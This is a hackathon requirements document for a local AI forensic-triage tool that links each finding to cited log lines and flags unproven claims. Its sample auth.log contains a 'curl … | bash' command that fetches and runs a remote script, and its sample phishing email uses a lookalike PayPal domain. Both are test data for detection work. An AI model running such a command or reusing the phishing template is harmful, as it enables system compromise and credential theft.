# RECEIPTS — Product Requirements Doc

## Thesis (this is what wins top prize, not the feature list)

Every AI security tool says "here's the verdict" and hides the reasoning. Security people don't trust that, and they're right not to. So:

**RECEIPTS** makes every claim traceable to a byte in the artifact. Claims it can't prove get stamped UNCONFIRMED. And it runs on open weights locally, so the log never leaves the machine — because in security, the log is the crown jewel.

Three legs: **auditability**, **honesty**, **privacy**. All three are exactly what security judges want, and all three are things Gemma 4 uniquely enables — structured output, long context, open weights.

## Why this beats the room

| What 95% of the room will build | What you build |
|---------------------------------|----------------|
| "ChatGPT for logs" — paste logs, get a paragraph | Paste logs, get findings that link back to line numbers |
| Claims you have to trust | Every claim verified by code, not by vibes |
| Confidently wrong on ambiguous evidence | UNCONFIRMED badge — it says "I don't know" |
| Cloud-only, data egress | Airplane-mode demo — Wi-Fi physically off on stage |
| One screenshot, no provenance | SHA-256 evidence hash + numbered Exhibits — actual chain of custody |

That last row costs you 20 minutes and makes the thing look like real forensic tooling.

## Scope for 5 hours (freeze this now)

**IN:** Drop or paste one artifact (log, email, config, JWT, or a screenshot). SHA-256 + Exhibit number. One Gemma 4 call → strict JSON. Split-pane: artifact with line numbers on the left, findings on the right. Click a finding → cited lines highlight. Validator stamps VERIFIED / UNCONFIRMED. ATT&CK technique tags. Next 3 actions.

**OUT:** accounts, history, multi-artifact correlation, PDF export, ATT&CK Navigator layer, any backend beyond a key proxy.

The two extra screenshots are ready-made test artifacts — the EDR alert and the phishing email are your multimodal inputs for the demo, so you don't lose 40 minutes hunting for samples.

Build to the mockup. Don't redesign at hour 4.

## The 5-hour battle plan

| Clock | Block | Non-negotiable output |
|-------|-------|-----------------------|
| 0:00–0:30 | Prompt + data only. No UI. | System prompt written, 3 test artifacts loaded, one raw curl returning valid JSON |
| 0:30–2:00 | UI shell | Drop/paste + file picker, artifact renders with line numbers, Exhibit hash + timestamp header |
| 2:00–3:00 | Wire the call | Full JSON contract rendered as finding cards, severity chips, ATT&CK tags |
| 3:00–3:45 | The differentiator | Validator + VERIFIED/UNCONFIRMED badges + click-to-highlight cited lines |
| 3:45–4:15 | Polish | Empty state, loading skeleton, error state, IOC copy buttons |
| 4:15–4:45 | Rehearse | Backup screen recording, run the demo end-to-end twice |
| 4:45–5:00 | Buffer | You will need this |

**Hard rule:** feature freeze at 4:15. A tight thing that demos flawlessly beats a sprawling thing that stutters.

## System prompt (paste this)

You are a forensic triage analyst. You receive ONE raw artifact: a log excerpt, an email, a config file, a JWT, or a screenshot of a security alert.

**HARD RULES** — violating these is worse than being wrong:

1. Every finding MUST cite a line range from the artifact (1-indexed, inclusive). For images, cite the visible text span you relied on.
2. Copy the exact supporting substring into `evidence_quote`, character-for-character, from within your cited range. Do not paraphrase it. Do not trim words.
3. If you cannot ground a claim in specific text, set `grounded=false` and `citation=null`. Never invent a citation to look complete.
4. Prefer "consistent with" over "is". You are triaging, not convicting.
5. Map at most ONE MITRE ATT&CK technique id per finding. If none fits, use null. Do not stretch a technique to look thorough.
6. List everything you genuinely could not determine in "unknowns".
7. Output JSON only. No prose, no markdown fences.

Scoring priorities: a finding with a correct citation beats a clever finding without one. An honest "unknowns" entry beats a confident guess.

## The output contract

```json
{
  "artifact_type": "auth_log | email | config | jwt | screenshot | unknown",
  "summary": "one plain-language sentence",
  "verdict": { "severity": "critical|high|medium|low|benign", "label": "...", "confidence": 0.0 },
  "findings": [{
    "id": "F1",
    "title": "short, specific",
    "detail": "what it means and why it matters",
    "severity": "critical|high|medium|low|info",
    "citation": { "start_line": 12, "end_line": 12 },
    "evidence_quote": "exact substring from those lines",
    "grounded": true,
    "attack": { "technique_id": "T1110.001", "name": "Brute Force: Password Guessing" },
    "confidence": 0.9
  }],
  "iocs": [{ "type": "ip|domain|user|hash|path|url", "value": "...", "line": 14 }],
  "next_actions": ["...", "...", "..."],
  "unknowns": ["..."]
}
```

## The validator (~15 lines, and it's the whole pitch)

Override the model's `grounded` field with this. That's the point: the model's claims are checked by code, not taken on faith.

```js
const norm = s => (s ?? '').replace(/\s+/g, ' ').trim();

function verify(finding, lines) {
  if (!finding.citation || !finding.evidence_quote)
    return { ...finding, grounded: false, reason: 'no citation provided' };

  const { start_line: a, end_line: b } = finding.citation;
  const span = norm(lines.slice(a - 1, b).join(' '));
  const ok = span.includes(norm(finding.evidence_quote));

  return {
    ...finding,
    grounded: ok,
    reason: ok ? 'quote found in cited range' : 'quote NOT found in cited range'
  };
}
```

Render `grounded === false` as the amber UNCONFIRMED badge, and put `reason` in a tooltip. Being transparent about a failed check is more impressive than hiding it.

## Test artifacts (copy-paste, ready now)

### Artifact A — auth.log

Rich, ambiguous, and the ambiguity is the demo.

```
Feb 11 02:14:07 web01 sshd[29113]: Failed password for invalid user admin from 203.0.113.44 port 51422 ssh2
Feb 11 02:14:09 web01 sshd[29115]: Failed password for invalid user admin from 203.0.113.44 port 51438 ssh2
Feb 11 02:14:11 web01 sshd[29117]: Failed password for invalid user root from 203.0.113.44 port 51452 ssh2
Feb 11 02:14:13 web01 sshd[29119]: Failed password for invalid user oracle from 203.0.113.44 port 51466 ssh2
Feb 11 02:14:16 web01 sshd[29121]: Failed password for invalid user postgres from 203.0.113.44 port 51480 ssh2
Feb 11 02:14:18 web01 sshd[29123]: Failed password for invalid user jenkins from 203.0.113.44 port 51494 ssh2
Feb 11 02:14:21 web01 sshd[29125]: Failed password for invalid user ubuntu from 203.0.113.44 port 51508 ssh2
Feb 11 02:14:24 web01 sshd[29127]: Accepted password for deploy from 203.0.113.44 port 51522 ssh2
Feb 11 02:14:24 web01 sshd[29127]: pam_unix(sshd:session): session opened for user deploy by (uid=1002)
Feb 11 02:31:02 web01 sudo:   deploy : TTY=pts/0 ; PWD=/var/www ; USER=root ; COMMAND=/usr/bin/apt-get install nginx
Feb 11 02:47:55 web01 sshd[29884]: Accepted publickey for deploy from 198.51.100.7 port 44112 ssh2
Feb 11 02:48:01 web01 sudo:   deploy : TTY=pts/1 ; PWD=/home/deploy ; USER=root ; COMMAND=/bin/bash -c "curl -s http://198.51.100.7/x.sh | bash"
Feb 11 03:02:19 web01 systemd[1]: Started Session 14 of user deploy.
Feb 11 03:02:20 web01 CRON[30112]: (root) CMD (/usr/local/bin/backup.sh)
Feb 11 03:14:33 web01 sshd[30551]: Failed password for deploy from 203.0.113.44 port 51600 ssh2
Feb 11 03:14:35 web01 sshd[30553]: Accepted password for deploy from 203.0.113.44 port 51614 ssh2
Feb 11 03:40:11 web01 sshd[31002]: Received disconnect from 203.0.113.44 port 51522:11: Bye Bye
```

**Why it's perfect:** brute force (T1110.001), user enumeration, then a valid login from the attacking IP — and a `curl | bash` from a different IP 33 minutes later (T1059.004). Whether 198.51.100.7 is the real attacker or an admin is genuinely undecidable from this log. That's your UNCONFIRMED / unknowns moment, and it's honest.

### Artifact B — phishing email

Drop it as text, or screenshot it and drop the image to show multimodal.

```
Return-Path: <billing@paypa1-secure.com>
Received: from mx.paypa1-secure.com (mx.paypa1-secure.com [198.51.100.88])
        by mail.corp.example (Postfix) with ESMTPS id 4B7C1A2F
        for <dana@corp.example>; Tue, 11 Feb 2026 09:14:02 +0000
From: "PayPal Service" <billing@paypa1-secure.com>
Reply-To: refunds@paypal-secure.net
To: dana@corp.example
Subject: [Action Required] Your account has been limited
Authentication-Results: mail.corp.example; spf=pass smtp.mailfrom=paypa1-secure.com;
 dkim=none; dmarc=pass header.from=paypa1-secure.com

Dear Customer,
We noticed unusual activity. Your account has been limited.
Please confirm your details within 24 hours to avoid suspension.
https://www.paypal.com/signin  ->  actually points to paypa1-secure.com/login?session=8f2a1c
Thanks,
The PayPal Team
```

**Why it's perfect:** `paypa1` uses a digit 1 instead of letter l — a homoglyph. SPF and DMARC pass, because the attacker owns the lookalike domain. Reply-To is on a third domain. That combination is the exact thing that fools people and that a lazy AI tool calls "safe" because SPF passed. Your tool catching the homoglyph while the auth headers pass is a chef's kiss demo beat.

### Artifact C — the EDR screenshot you already have, for the image path.

## The 3-minute demo

| Time | Beat |
|------|------|
| 0:00–0:25 | Cold open. Screen shows 200 lines of raw auth.log. "Ask any AI what happened here and you get a paragraph you have to trust." |
| 0:25–0:55 | Drop it. EXHIBIT 003 + SHA-256 stamps in. Findings land with ATT&CK tags. |
| 0:55–1:35 | Click a VERIFIED finding → the exact line highlights. "Every claim points at a byte." |
| 1:35–2:00 | Click the UNCONFIRMED one. "And when it can't prove it, it says so. No hallucinated confidence." Read the unknowns list aloud. |
| 2:00–2:30 | The money shot. Flip LOCAL MODE, physically pull the Wi-Fi, drop the EDR screenshot. "Log never left the machine. Open weights. In security, the log is the crown jewel." |
| 2:30–3:00 | Phishing email as the closer — homoglyph caught while SPF/DMARC pass. "RECEIPTS. AI you can cross-examine." |

Rehearse the Wi-Fi pull specifically. It's 15 seconds and it's the highest-value moment in the whole thing.

## If you fall behind

Cut in this order: Local Mode → IOC table → click-to-highlight → ATT&CK tags. Never cut the VERIFIED/UNCONFIRMED badges. That's the thesis; without it you're just another log summarizer.

## Non-negotiable beats before you present

- Every finding visibly links to a highlighted line
- At least one claim is honestly stamped UNCONFIRMED
- Exhibit hash + timestamp visible
- One image artifact works end to end
- Backup screen recording exists
- You can say the thesis in one breath: "Every claim traceable, every gap admitted, nothing leaves the machine."
